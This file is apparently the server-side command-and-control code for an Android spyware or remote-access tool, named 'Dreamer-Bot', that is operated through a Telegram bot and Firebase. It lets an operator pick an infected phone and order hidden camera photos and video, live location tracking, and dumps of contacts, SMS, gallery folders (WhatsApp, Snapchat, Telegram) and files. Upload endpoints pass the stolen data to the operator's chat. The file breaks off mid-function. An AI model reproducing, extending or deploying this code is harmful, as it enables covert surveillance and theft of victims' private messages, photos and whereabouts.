import express from "express";
import multer  from "multer";
import fs      from "fs";
import path    from "path";
import TelegramBot from "node-telegram-bot-api";
import { initializeApp, cert } from "firebase-admin/app";
import { getDatabase }         from "firebase-admin/database";

/* ── ENV ─────────────────────────────────────────── */
const {
  BOT_TOKEN, FIREBASE_SERVICE_ACCOUNT, BASE_URL,
  AUTH_KEY = ""
} = process.env;
if (!BOT_TOKEN || !BASE_URL || !FIREBASE_SERVICE_ACCOUNT)
  throw new Error("Missing env vars");

/* ── Firebase Admin ─────────────────────────────── */
const sa = JSON.parse(FIREBASE_SERVICE_ACCOUNT);
initializeApp({
  credential : cert(sa),
  databaseURL: `https://${sa.project_id}-default-rtdb.firebaseio.com`
});
const db = getDatabase();

/* ── Express & Telegram setup ───────────────────── */
const app    = express();
const upload = multer({ dest: "/tmp" });
const PORT   = process.env.PORT || 3000;
app.use(express.json());
app.use(express.text());

const bot = new TelegramBot(BOT_TOKEN);
bot.setWebHook(`${BASE_URL}/bot/${BOT_TOKEN}`);
app.post(`/bot/${BOT_TOKEN}`, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });

/* ── State Management ───────────────────────────── */
const userSessions = new Map();  // chatId -> {key, selectedDevice, lastActivity}
const awaitingAuth = new Map();  // chatId -> {messageId, timestamp}
const awaitingCustom = new Map(); // chatId -> {label, promptId, device}
const activeOperations = new Map(); // chatId -> {type, startTime, device}
const permissionRequests = new Map(); // chatId -> {deviceId, permission}

/* ── Helpers ────────────────────────────────────── */
const enc    = s => Buffer.from(s).toString("base64url");
const dec    = b => Buffer.from(b, "base64url").toString();
const parent = k => enc(path.dirname(dec(k)));

/* ── Animated Progress Messages ─────────────────── */
const progressAnimations = {
  photo: ["📸", "📷", "📸", "✨"],
  video: ["🎥", "🎬", "🎞️", "✅"],
  location: ["📍", "🗺️", "🧭", "📍"],
  files: ["📂", "📁", "🗂️", "📂"],
  gallery: ["🖼️", "🎨", "📸", "✨"],
  contacts: ["📱", "👥", "📋", "✅"],
  sms: ["💬", "📨", "✉️", "✅"],
  permission: ["🔐", "⚙️", "🔧", "✅"]
};

const loadingFrames = [
  "⚡ ░░░░░░░░░░ 0%",
  "⚡ ▓░░░░░░░░░ 10%", 
  "⚡ ▓▓░░░░░░░░ 20%",
  "⚡ ▓▓▓░░░░░░░ 30%",
  "⚡ ▓▓▓▓░░░░░░ 40%",
  "⚡ ▓▓▓▓▓░░░░░ 50%",
  "⚡ ▓▓▓▓▓▓░░░░ 60%",
  "⚡ ▓▓▓▓▓▓▓░░░ 70%",
  "⚡ ▓▓▓▓▓▓▓▓░░ 80%",
  "⚡ ▓▓▓▓▓▓▓▓▓░ 90%",
  "⚡ ▓▓▓▓▓▓▓▓▓▓ 100%"
];

/* ── Session Management ─────────────────────────── */
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes

function cleanupSessions() {
  const now = Date.now();
  for (const [chatId, session] of userSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      userSessions.delete(chatId);
    }
  }
}
setInterval(cleanupSessions, 5 * 60 * 1000);

function updateActivity(chatId) {
  const session = userSessions.get(chatId);
  if (session) {
    session.lastActivity = Date.now();
  }
}

async function getDevices(key) {
  const snapshot = await db.ref(`devices/${key}`).once('value');
  const devices = snapshot.val();
  if (!devices) return [];
  
  return Object.entries(devices).map(([id, data]) => ({
    id,
    model: data.info?.model || 'Unknown',
    lastSeen: data.info?.time || 0,
    online: Date.now() - (data.info?.time || 0) < 5 * 60 * 1000,
    battery: data.info?.battery || -1,
    storage: data.info?.storage || {},
    permissions: data.info?.permissions || {}
  }));
}

/* ── Animated Loading ───────────────────────────── */
async function showAnimatedLoading(chatId, msgId, type = "default", duration = 3000) {
  const frames = progressAnimations[type] || ["⏳", "⌛", "⏳", "✅"];
  const steps = Math.min(10, Math.floor(duration / 300));
  
  for (let i = 0; i <= steps; i++) {
    const progress = Math.floor((i / steps) * 10);
    const frame = frames[i % frames.length];
    
    try {
      await bot.editMessageText(
        `${frame} *Processing...*\n\n` +
        `\`\`\`\n${loadingFrames[progress]}\n\`\`\`\n` +
        `_Please wait..._`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown'
        }
      );
      
      if (i < steps) await new Promise(resolve => setTimeout(resolve, 300));
    } catch (e) {
      // Message might have been edited already
      break;
    }
  }
}

/* ── Login Flow with Animations ─────────────────── */
const loginKeyboard = {
  inline_keyboard: [
    [{text: "🔐 Enter Access Key", callback_data: "login_start"}]
  ]
};

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const session = userSessions.get(chatId);
  
  if (session && session.key) {
    updateActivity(chatId);
    await showDeviceSelection(chatId);
  } else {
    const welcomeMsg = await bot.sendAnimation(chatId, 
      'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif',
      {
        caption: "*🔒 Dreamer-Bot Security Portal*\n\n" +
                "Welcome to the most advanced device control system.\n\n" +
                "🔐 *Security Features:*\n" +
                "• End-to-end encrypted connection\n" +
                "• Multi-device management\n" +
                "• Real-time status monitoring\n" +
                "• Background service persistence\n" +
                "• Permission management\n\n" +
                "_Click below to authenticate_",
        parse_mode: 'Markdown',
        reply_markup: loginKeyboard
      }
    );
  }
});

/* ── Device Selection with Enhanced UI ──────────── */
async function showDeviceSelection(chatId) {
  const session = userSessions.get(chatId);
  if (!session) return;
  
  const devices = await getDevices(session.key);
  
  if (devices.length === 0) {
    await bot.sendAnimation(chatId,
      'https://media.giphy.com/media/3o7aTskHEUdgCQAXde/giphy.gif',
      {
        caption: "⚠️ *No Devices Found*\n\n" +
                "No devices are registered with this key.\n" +
                "Please install the app on a device first.\n\n" +
                "_The device will appear here automatically once connected._",
        parse_mode: 'Markdown'
      }
    );
    return;
  }
  
  const keyboard = {
    inline_keyboard: devices.map(dev => {
      const status = dev.online ? '🟢' : '🔴';
      const battery = dev.battery > 0 ? `${dev.battery}%🔋` : '';
      return [{
        text: `${status} ${dev.model} ${battery} (${dev.id.slice(0, 6)})`,
        callback_data: `select_${dev.id}`
      }];
    })
  };
  
  keyboard.inline_keyboard.push([
    {text: "🔄 Refresh", callback_data: "refresh_devices"},
    {text: "📊 System Status", callback_data: "system_status"}
  ]);
  
  keyboard.inline_keyboard.push([
    {text: "🚪 Logout", callback_data: "logout_confirm"}
  ]);
  
  await bot.sendMessage(chatId,
    "*📱 Connected Devices*\n\n" +
    `Found *${devices.length}* device${devices.length > 1 ? 's' : ''}\n\n` +
    "🟢 Online | 🔴 Offline\n\n" +
    "_Select a device to control:_",
    { 
      parse_mode: 'Markdown',
      reply_markup: keyboard 
    }
  );
}

/* ── Enhanced Main Menu ─────────────────────────── */
function getMainMenu(includeBack = false) {
  const menu = {
    inline_keyboard: [
      [{text:"📸 Gallery Manager", callback_data:"gallery_root"}],
      [{text:"📂 File Explorer", callback_data:"file_menu"}],
      [
        {text:"🤳 Front Cam", callback_data:"cam_front"},
        {text:"📷 Back Cam", callback_data:"cam_back"}
      ],
      [{text:"📍 Location Services", callback_data:"location_menu"}],
      [{text:"📊 Data Extraction", callback_data:"data_menu"}],
      [{text:"⚙️ Device Controls", callback_data:"device_menu"}],
      [{text:"🔐 Permissions Check", callback_data:"check_permissions"}]
    ]
  };
  
  if (includeBack) {
    menu.inline_keyboard.push([
      {text:"🔄 Switch Device", callback_data:"switch_device"},
      {text:"🏠 Home", callback_data:"device_list"}
    ]);
  }
  
  return menu;
}

/* ── Sub-Menus ──────────────────────────────────── */
const getFileMenu = () => ({
  inline_keyboard: [
    [{text: "📁 Browse Files", callback_data: "file_root"}],
    [{text: "⚡ Quick Access", callback_data: "file_quick"}],
    [{text: "💾 Storage Info", callback_data: "file_storage"}],
    [{text: "🔍 Search Files", callback_data: "file_search_prompt"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getLocationMenu = () => ({
  inline_keyboard: [
    [{text: "📍 Current Location", callback_data: "loc_now"}],
    [{text: "🎯 Start Tracking", callback_data: "loc_start"}],
    [{text: "⏹️ Stop Tracking", callback_data: "loc_stop"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getDataMenu = () => ({
  inline_keyboard: [
    [{text: "📱 Contacts", callback_data: "dump_contacts"}],
    [{text: "💬 SMS Messages", callback_data: "dump_sms"}],
    [{text: "📊 Device Info", callback_data: "device_info"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getDeviceMenu = () => ({
  inline_keyboard: [
    [{text: "🔋 Battery Status", callback_data: "battery_status"}],
    [{text: "📶 Network Info", callback_data: "network_info"}],
    [{text: "📱 App List", callback_data: "app_list"}],
    [{text: "🔄 Restart Services", callback_data: "restart_services"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

/* ── Gallery with Thumbnails ────────────────────── */
const gallery = ["whatsapp","screenshots","snapchat","camera","instagram","downloads","telegram","all"];
const getGalleryKeyboard = (includeBack = true) => {
  const kb = {
    inline_keyboard: []
  };
  
  gallery.filter(g => g !== "all").forEach((folder, i) => {
    if (i % 2 === 0) kb.inline_keyboard.push([]);
    kb.inline_keyboard[kb.inline_keyboard.length - 1].push({
      text: `📁 ${folder.charAt(0).toUpperCase() + folder.slice(1)}`,
      callback_data: `gallery_${folder}`
    });
  });
  
  kb.inline_keyboard.push([{
    text: "🖼️ All Images",
    callback_data: "gallery_all"
  }]);
  
  if (includeBack) {
    kb.inline_keyboard.push([{text: "🔙 Back to Menu", callback_data: "main_menu"}]);
  }
  
  return kb;
};

/* ── Enhanced Callback Handler ──────────────────── */
bot.on("callback_query", async q => {
  const {id, data, message} = q;
  const chatId = message.chat.id;
  const msgId = message.message_id;
  
  try {
    /* ── Login Flow ─────────────────────────────── */
    if (data === "login_start") {
      await bot.answerCallbackQuery(id);
      const prompt = await bot.sendMessage(chatId,
        "*🔑 Authentication Required*\n\n" +
        "Please enter your access key:\n\n" +
        "💡 _The key is in your app's_ `secret_key.txt` _file_",
        { 
          parse_mode: 'Markdown',
          reply_markup: { force_reply: true }
        }
      );
      awaitingAuth.set(chatId, {
        messageId: prompt.message_id,
        timestamp: Date.now()
      });
      return;
    }
    
    /* ── System Status ──────────────────────────── */
    if (data === "system_status") {
      await bot.answerCallbackQuery(id, { text: "Loading system status..." });
      const session = userSessions.get(chatId);
      if (!session) return;
      
      const devices = await getDevices(session.key);
      let statusText = "*📊 System Status*\n\n";
      
      devices.forEach(dev => {
        const status = dev.online ? '🟢 Online' : '🔴 Offline';
        const lastSeen = new Date(dev.lastSeen).toLocaleString();
        const storage = dev.storage.available 
          ? `${Math.round((dev.storage.available / (1024**3)) * 10) / 10} GB free`
          : 'Unknown';
        
        statusText += `*Device:* ${dev.model}\n`;
        statusText += `*ID:* \`${dev.id}\`\n`;
        statusText += `*Status:* ${status}\n`;
        statusText += `*Battery:* ${dev.battery > 0 ? dev.battery + '%' : 'Unknown'}\n`;
        statusText += `*Storage:* ${storage}\n`;
        statusText += `*Last Seen:* ${lastSeen}\n`;
        statusText += `─────────────────\n`;
      });
      
      await bot.sendMessage(chatId, statusText, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[{text: "🔙 Back", callback_data: "device_list"}]]
        }
      });
      return;
    }
    
    /* ── Device Menu Navigation ─────────────────── */
    if (data === "device_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*⚙️ Device Controls*\n\n" +
        "Advanced device management options:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getDeviceMenu()
        }
      );
      return;
    }
    
    /* ── Permission Checker ─────────────────────── */
    if (data === "check_permissions") {
      await bot.answerCallbackQuery(id, { text: "Checking permissions..." });
      const session = userSessions.get(chatId);
      if (!session || !session.selectedDevice) return;
      
      await showAnimatedLoading(chatId, msgId, "permission", 2000);
      
      await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
        command: "check_permissions",
        chat: chatId,
        msg: msgId,
        ts: Date.now()
      });
      return;
    }
    
    /* ── Refresh Devices ────────────────────────── */
    if (data === "refresh_devices") {
      await bot.answerCallbackQuery(id, { text: "Refreshing device list..." });
      await showDeviceSelection(chatId);
      return;
    }
    
    /* ── Switch Device ──────────────────────────── */
    if (data === "switch_device" || data === "device_list") {
      await bot.answerCallbackQuery(id);
      await showDeviceSelection(chatId);
      return;
    }
    
    /* ── Session Check ──────────────────────────── */
    const session = userSessions.get(chatId);
    if (!session || !session.key) {
      await bot.answerCallbackQuery(id, {
        text: "⚠️ Session expired. Please login again.",
        show_alert: true
      });
      await bot.sendMessage(chatId, "Session expired. Please use /start to login again.");
      return;
    }
    
    updateActivity(chatId);
    
    /* ── Device Selection ───────────────────────── */
    if (data.startsWith("select_")) {
      const deviceId = data.replace("select_", "");
      session.selectedDevice = deviceId;
      await bot.answerCallbackQuery(id, { text: "✅ Device selected" });
      
      await showAnimatedLoading(chatId, msgId, "default", 1000);
      
      await bot.editMessageText(
        `*🎯 Control Center*\n\n` +
        `Device: \`${deviceId.slice(0, 6)}...\`\n\n` +
        `Select an action:`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getMainMenu(true)
        }
      );
      return;
    }
    
    /* ── Navigation Handlers ────────────────────── */
    if (data === "main_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*🎛️ Control Panel*\n\n" +
        `Device: \`${session.selectedDevice?.slice(0, 6) || 'None'}...\`\n\n` +
        "Select an action:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getMainMenu(true)
        }
      );
      return;
    }
    
    /* ── Sub-Menu Navigation ────────────────────── */
    if (data === "file_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📂 File Explorer*\n\n" +
        "Choose an option:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getFileMenu()
        }
      );
      return;
    }
    
    if (data === "location_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📍 Location Services*\n\n" +
        "Choose an option:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getLocationMenu()
        }
      );
      return;
    }
    
    if (data === "data_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📊 Data Extraction*\n\n" +
        "Choose data to extract:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getDataMenu()
        }
      );
      return;
    }
    
    /* ── Camera with Preview ────────────────────── */
    if (data === "cam_front" || data === "cam_back") {
      const side = data === "cam_front" ? "Front" : "Back";
      const emoji = data === "cam_front" ? "🤳" : "📷";
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        `*${emoji} ${side} Camera*\n\n` +
        "Select action:\n\n" +
        "_Photos are captured in high quality_\n" +
        "_Videos support up to 5 minutes recording_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text:"📸 Capture Photo", callback_data:`capture_${side.toLowerCase()}` },
                { text:"🎥 Record Video", callback_data:`rec_${side.toLowerCase()}` }
              ],
              [{ text:"🔙 Back", callback_data:"main_menu" }]
            ]
          }
        }
      );
      return;
    }
    
    /* ── Gallery Root Menu ──────────────────────── */
    if (data === "gallery_root") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📸 Gallery Manager*\n\n" +
        "Select a folder to browse:\n\n" +
        "_Each folder shows the latest images first_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getGalleryKeyboard()
        }
      );
      return;
    }
    
    /* ── Device Check ───────────────────────────── */
    if (!session.selectedDevice) {
      await bot.answerCallbackQuery(id, {
        text: "⚠️ Please select a device first",
        show_alert: true
      });
      await showDeviceSelection(chatId);
      return;
    }
    
    const devicePath = `devices/${session.key}/${session.selectedDevice}`;
    
    /* ── Execute Commands ───────────────────────── */
    const commandMap = {
      // Camera
      "capture_front": { type: "photo", msg: "📸 Capturing front photo..." },
      "capture_back": { type: "photo", msg: "📷 Capturing back photo..." },
      
      // Location
      "loc_now": { type: "location", msg: "📍 Getting current location..." },
      "loc_start": { type: "location", msg: "🎯 Starting location tracking..." },
      "loc_stop": { type: "location", msg: "⏹️ Stopping location tracking..." },
      
      // Data
      "dump_contacts": { type: "contacts", msg: "📱 Extracting contacts..." },
      "dump_sms": { type: "sms", msg: "💬 Extracting SMS messages..." },
      "device_info": { type: "files", msg: "📊 Getting device information..." },
      
      // Files
      "file_root": { type: "files", msg: "📂 Loading file explorer..." },
      "file_quick": { type: "files", msg: "⚡ Loading quick access..." },
      "file_storage": { type: "files", msg: "💾 Calculating storage..." },
      
      // Device
      "battery_status": { type: "default", msg: "🔋 Getting battery status..." },
      "network_info": { type: "default", msg: "📶 Getting network info..." },
      "app_list": { type: "default", msg: "📱 Getting app list..." },
      "restart_services": { type: "default", msg: "🔄 Restarting services..." }
    };
    
    // Check if it's a direct command
    const cmdInfo = commandMap[data];
    if (cmdInfo) {
      await bot.answerCallbackQuery(id, { text: cmdInfo.msg });
      activeOperations.set(chatId, {
        type: cmdInfo.type,
        startTime: Date.now(),
        device: session.selectedDevice
      });
      
      await showAnimatedLoading(chatId, msgId, cmdInfo.type, 2000);
      
      await db.ref(devicePath).update({
        command: data,
        chat: chatId,
        msg: msgId,
        ts: Date.now()
      });
      return;
    }
    
    // Handle other command patterns
    const isCommand = data.startsWith("capture_") || 
                     data.startsWith("rec_") ||
                     data.startsWith("file_") || 
                     data.startsWith("filepage_") || 
                     data.startsWith("fileget_") ||
                     data.startsWith("gallery_") ||
                     data.startsWith("gopics_");
    
    if (isCommand) {
      await bot.answerCallbackQuery(id, { text: "⏳ Processing..." });
      
      const type = data.startsWith("gallery_") || data.startsWith("gopics_") ? "gallery" : "files";
      activeOperations.set(chatId, {
        type,
        startTime: Date.now(),
        device: session.selectedDevice
      });
      
      await showAnimatedLoading(chatId, msgId, type, 2000);
      
      await db.ref(devicePath).update({
        command: data,
        chat: chatId,
        msg: msgId,
        ts: Date.now()
      });
      return;
    }
    
    // Handle recording duration menu
    if (data === "rec_front" || data === "rec_back") {
      const side = data.slice(4);
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*⏱️ Recording Duration*\n\n" +
        "Select video duration:\n\n" +
        "_Longer videos take more time to upload_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {text:"⏱️ 30 seconds", callback_data:`rec_${side}_00.5`},
                {text:"⏱️ 1 minute", callback_data:`rec_${side}_01`}
              ],
              [
                {text:"⏱️ 2 minutes", callback_data:`rec_${side}_02`},
                {text:"⏱️ 5 minutes", callback_data:`rec_${side}_05`}
              ],
              [{ text:"🔙 Back", callback_data:`cam_${side}` }]
            ]
          }
        }
      );
      return;
    }
    
    /* ── Gallery Custom Count ───────────────────── */
    if (data.startsWith("gallery_custom_")) {
      await bot.answerCallbackQuery(id);
      const label = data.replace("gallery_custom_","");
      const prompt = await bot.sendMessage(chatId,
        `*📸 Custom Gallery Request*\n\n` +
        `How many *${label}* images would you like?\n\n` +
        `Enter a number between 1 and 200:`,
        {
          parse_mode: "Markdown",
          reply_markup: { force_reply: true }
        }
      );
      awaitingCustom.set(chatId, {
        label,
        promptId: prompt.message_id,
        device: session.selectedDevice
      });
      return;
    }
    
    /* ── Default Handler ────────────────────────── */
    await bot.answerCallbackQuery(id);
    
  } catch (error) {
    console.error('Callback error:', error);
    await bot.answerCallbackQuery(id, {
      text: "❌ An error occurred. Please try again.",
      show_alert: true
    });
  }
});

/* ── Message Handler for Inputs ─────────────────── */
bot.on("message", async m => {
  if (!m.text) return;
  const chatId = m.chat.id;
  
  // Handle authentication
  const authState = awaitingAuth.get(chatId);
  if (authState && m.reply_to_message?.message_id === authState.messageId) {
    const key = m.text.trim();
    awaitingAuth.delete(chatId);
    
    // Delete the key message for security
    try {
      await bot.deleteMessage(chatId, m.message_id);
    } catch (e) {}
    
    // Show loading animation
    const loadingMsg = await bot.sendAnimation(chatId,
      'https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif',
      {
        caption: "*🔐 Authenticating...*\n\n_Verifying access key..._",
        parse_mode: 'Markdown'
      }
    );
    
    // Check if key exists in Firebase
    const devicesSnapshot = await db.ref(`devices/${key}`).once('value');
    if (devicesSnapshot.exists()) {
      userSessions.set(chatId, {
        key,
        selectedDevice: null,
        lastActivity: Date.now()
      });
      
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      
      await bot.sendAnimation(chatId, 
        'https://media.giphy.com/media/dWesBcTLavkZuG35MI/giphy.gif',
        {
          caption: "*✅ Authentication Successful*\n\n" +
                  `Welcome! Access granted.\n\n` +
                  "_Loading your devices..._",
          parse_mode: 'Markdown'
        }
      );
      
      setTimeout(() => showDeviceSelection(chatId), 2000);
    } else {
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      
      await bot.sendAnimation(chatId,
        'https://media.giphy.com/media/3ohzdQ1IynzclJldUQ/giphy.gif',
        {
          caption: "*❌ Authentication Failed*\n\n" +
                  "The access key is invalid.\n\n" +
                  "_Please check your secret\\_key.txt file_\n\n" +
                  "Use /start to try again.",
          parse_mode: 'Markdown'
        }
      );
    }
    return;
  }
  
  // Handle custom gallery count
  const customState = awaitingCustom.get(chatId);
  if (customState && m.reply_to_message?.message_id === customState.promptId) {
    const n = parseInt(m.text.trim(), 10);
    if (isNaN(n) || n < 1 || n > 200) {
      await bot.sendMessage(chatId,
        "❌ *Invalid number*\n\n" +
        "Please enter a number between 1-200.",
        { parse_mode: 'Markdown' }
      );
      return;
    }
    
    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) return;
    
    awaitingCustom.delete(chatId);
    
    const cmd = `gopics_${customState.label}_${n.toString().padStart(3,"0")}`;
    const statusMsg = await bot.sendMessage(chatId,
      `*📸 Gallery Upload Started*\n\n` +
      `Preparing to send ${n} *${customState.label}* images...\n\n` +
      `⏳ This may take a few moments`,
      { parse_mode: "Markdown" }
    );
    
    await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
      command: cmd,
      chat: chatId,
      msg: statusMsg.message_id,
      ts: Date.now()
    });
  }
  
  // Handle file search
  if (m.text.startsWith("/search ")) {
    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
      await bot.sendMessage(chatId, "Please login and select a device first.");
      return;
    }
    
    const query = m.text.replace("/search ", "").trim();
    if (query.length < 2) {
      await bot.sendMessage(chatId, "Search query must be at least 2 characters.");
      return;
    }
    
    const searchMsg = await bot.sendMessage(chatId,
      `*🔍 Searching Files*\n\n` +
      `Query: "${query}"\n\n` +
      `_Scanning device storage..._`,
      { parse_mode: 'Markdown' }
    );
    
    await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
      command: `filesearch_${query}`,
      chat: chatId,
      msg: searchMsg.message_id,
      ts: Date.now()
    });
  }
});

/* ── Enhanced Upload Endpoints ──────────────────── */

// Helper to extract device info
function getDeviceInfo(authHeader) {
  if (!authHeader) return null;
  
  const parts = authHeader.split(':');
  if (parts.length >= 2) {
    return { key: parts[0], deviceId: parts[1] };
  }
  return null;
}

// Helper to get active sessions for a key
function getActiveSessions(key) {
  return Array.from(userSessions.entries())
    .filter(([_, session]) => session.key === key)
    .map(([chatId, session]) => ({ chatId, session }));
}

/* 1) Photos with progress */
app.post("/capture", upload.single("photo"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) {
      console.log("Missing auth header");
      return res.sendStatus(403);
    }
    
    console.log(`Photo from ${deviceInfo.deviceId}`);
    
    const sessions = getActiveSessions(deviceInfo.key);
    if (sessions.length === 0) {
      res.json({ok: true, warning: "No active sessions"});
      fs.unlinkSync(req.file.path);
      return;
    }
    
    // Send to all active sessions
    for (const {chatId} of sessions) {
      try {
        const op = activeOperations.get(chatId);
        if (op && op.type === "photo") {
          activeOperations.delete(chatId);
        }
        
        await bot.sendPhoto(chatId, fs.readFileSync(req.file.path), {
          caption: `📸 *Photo Captured*\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n` +
                  `Time: ${new Date().toLocaleTimeString()}\n` +
                  `Quality: High`,
          parse_mode: 'Markdown'
        });
      } catch (e) {
        console.error(`Failed to send to ${chatId}:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Upload error:", error);
    res.status(500).json({error: error.message});
  } finally {
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }
  }
});

/* 2) Videos with duration info */
app.post("/video", upload.single("video"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    if (sessions.length === 0) {
      res.json({ok: true});
      fs.unlinkSync(req.file.path);
      return;
    }
    
    const duration = req.body.duration || "Unknown";
    const fileSize = req.file.size;
    
    for (const {chatId} of sessions) {
      try {
        await bot.sendVideo(chatId, fs.readFileSync(req.file.path), {
          caption: `🎥 *Video Recorded*\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n` +
                  `Duration: ${duration}\n` +
                  `Size: ${formatFileSize(fileSize)}\n` +
                  `Time: ${new Date().toLocaleTimeString()}`,
          parse_mode: 'Markdown'
        });
      } catch (e) {
        console.error(`Video send error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Video error:", error);
    res.status(500).json({error: error.message});
  } finally {
    if (req.file) fs.unlinkSync(req.file.path);
  }
});

/* 3) Enhanced location with map */
app.post("/json/location", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {lat, lon, accuracy, altitude, speed, type} = req.body;
    
    for (const {chatId} of sessions) {
      try {
        // Send location pin
        await bot.sendLocation(chatId, lat, lon);
        
        // Send details
        let details = `📍 *Location Update*\n\n`;
        details += `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n`;
        details += `Type: ${type || 'single'}\n`;
        details += `Accuracy: ${accuracy ? Math.round(accuracy) + 'm' : 'Unknown'}\n`;
        
        if (altitude) details += `Altitude: ${Math.round(altitude)}m\n`;
        if (speed && speed > 0) details += `Speed: ${Math.round(speed * 3.6)}km/h\n`;
        
        details += `Time: ${new Date().toLocaleString()}\n\n`;
        details += `[View on Map](https://www.google.com/maps?q=${lat},${lon})`;
        
        await bot.sendMessage(chatId, details, { 
          parse_mode: 'Markdown',
          disable_web_page_preview: true 
        });
        
      } catch (e) {
        console.error(`Location error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 4) Text data endpoints - FIXED */
app.post("/text/contacts", express.text(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const contactData = req.body;
    
    for (const {chatId} of sessions) {
      try {
        // Split into chunks if too large
        const maxLength = 4000;
        if (contactData.length > maxLength) {
          const chunks = contactData.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
          for (let i = 0; i < chunks.length; i++) {
            await bot.sendMessage(chatId, 
              `📱 *Contacts Export (Part ${i + 1}/${chunks.length})*\n\n` +
              `\`\`\`\n${chunks[i]}\n\`\`\``,
              { parse_mode: 'Markdown' }
            );
          }
        } else {
          await bot.sendMessage(chatId,
            `📱 *Contacts Export*\n\n` +
            `\`\`\`\n${contactData}\n\`\`\``,
            { parse_mode: 'Markdown' }
          );
        }
      } catch (e) {
        console.error(`Contacts send error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

app.post("/text/sms", express.text(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const smsData = req.body;
    
    for (const {chatId} of sessions) {
      try {
        // Split into chunks if too large
        const maxLength = 4000;
        if (smsData.length > maxLength) {
          const chunks = smsData.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
          for (let i = 0; i < chunks.length; i++) {
            await bot.sendMessage(chatId, 
              `💬 *SMS Export (Part ${i + 1}/${chunks.length})*\n\n` +
              `\`\`\`\n${chunks[i]}\n\`\`\``,
              { parse_mode: 'Markdown' }
            );
          }
        } else {
          await bot.sendMessage(chatId,
            `💬 *SMS Export*\n\n` +
            `\`\`\`\n${smsData}\n\`\`\``,
            { parse_mode: 'Markdown' }
          );
        }
      } catch (e) {
        console.error(`SMS send error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 5) File upload endpoint - FIXED */
app.post("/file", upload.single("blob"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {name, size, modified} = req.body;
    
    for (const {chatId} of sessions) {
      try {
        await bot.sendDocument(chatId, fs.readFileSync(req.file.path), {
          caption: `📄 *File Downloaded*\n\n` +
                  `Name: ${name}\n` +
                  `Size: ${size}\n` +
                  `Modified: ${modified}\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\``,
          parse_mode: 'Markdown'
        }, {
          filename: name
        });
      } catch (e) {
        console.error(`File send error:`, e.message);
      }
    }
    
